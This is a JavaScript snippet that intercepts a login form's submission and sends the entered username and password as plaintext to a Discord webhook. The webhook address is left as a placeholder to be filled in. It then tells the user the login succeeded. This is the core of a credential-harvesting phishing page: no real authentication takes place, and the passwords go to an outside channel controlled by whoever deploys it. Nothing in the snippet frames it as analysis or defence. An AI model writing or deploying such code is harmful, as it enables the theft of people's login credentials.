document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    // Prepare form data
    const formData = new FormData(this);
    const username = formData.get('username');
    const password = formData.get('password');

    // Construct the message to send to Discord
    const message = `New login:\nUsername: ${username}\nPassword: ${password}`;

    console.log("Sending the following data to Discord: ", message); // Debugging log

    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
    fetch('YOUR_DISCORD_WEBHOOK_URL', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: message
        }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send message to Discord, response status: ' + response.status);
        }
        alert('Login information submitted successfully!');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Failed to submit login information. See console for more details.');
    });
});
